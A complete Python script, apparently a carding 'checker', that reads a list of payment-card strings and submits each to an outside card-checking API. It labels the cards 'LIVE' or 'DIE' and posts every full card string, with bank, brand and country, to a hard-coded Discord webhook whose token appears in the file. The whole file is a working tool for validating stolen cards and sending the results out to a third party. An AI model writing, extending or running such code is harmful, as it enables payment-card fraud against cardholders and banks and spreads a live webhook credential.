import requests
import json
import time

INPUT_FILE = "list.txt"
API_URL = "https://api.chkr.cc/"
WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM"

approved, declined, unknown, errors = [], [], [], []


def send_embed(title, description, color):
    payload = {
        "embeds": [{
            "title": title,
            "description": description[:4090],
            "color": color,
            "footer": {"text": "String Checker"}
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass


def classify_from_code(code):
    if code == 1:
        return "approved"
    if code == 0:
        return "declined"
    return "unknown"


with open(INPUT_FILE, "r", encoding="utf-8") as f:
    lines = f.read().splitlines()

send_embed("Checker Started", "POST checking started…", 3447003)

for index, line in enumerate(lines, start=1):
    if not line.strip():
        continue

    try:
        r = requests.post(API_URL, data={"data": line}, timeout=30)
        data = r.json()

        # 🔹 Main fields
        code = data.get("code", 2)
        status = data.get("status", "Unknown")
        message = data.get("message", "No message")

        # 🔹 Card object (safe reads)
        card = data.get("card", {})
        card_string = card.get("card", line)
        bank = card.get("bank", "N/A")
        ctype = card.get("type", "N/A")
        category = card.get("category", "N/A")
        brand = card.get("brand", "N/A")

        country = card.get("country", {})
        country_name = country.get("name", "N/A")
        country_code = country.get("code", "N/A")
        country_emoji = country.get("emoji", "")

        result = classify_from_code(code)

        record = (
            f"string `{card_string}`\n"
            f"status {status}\n"
            f"message {message}\n\n"
            f"bank {bank}\n"
            f"type {ctype}\n"
            f"category {category}\n"
            f"brand {brand}\n"
            f"country {country_name} {country_emoji} ({country_code})"
        )

        if result == "approved":
            approved.append(record)
            send_embed("✅ LIVE", record, 3066993)

        elif result == "declined":
            declined.append(record)
            send_embed("❌ DIE", record, 15158332)

        else:
            unknown.append(record)
            send_embed("⚠ UNKNOWN", record, 15844367)

        print(f"[{index}] {status.upper()} → {message}")
        time.sleep(2.5)

    except json.JSONDecodeError:
        record = f"string `{line}`\nresponse Invalid JSON"
        errors.append(record)
        send_embed("🚫 ERROR", record, 9807270)
        time.sleep(3)

    except Exception as e:
        record = f"string `{line}`\nerror {e}"
        errors.append(record)
        send_embed("🚫 ERROR", record, 9807270)
        time.sleep(3)


# Save results
open("approved.txt", "w").write("\n".join(approved))
open("declined.txt", "w").write("\n".join(declined))
open("unknown.txt", "w").write("\n".join(unknown))
open("error.txt", "w").write("\n".join(errors))

summary = (
    f"✅ Live: {len(approved)}\n"
    f"❌ Die: {len(declined)}\n"
    f"⚠ Unknown: {len(unknown)}\n"
    f"🚫 Errors: {len(errors)}"
)

send_embed("Finished Checking", summary, 5763719)
print("\n✅ DONE CHECKING")
print(summary)

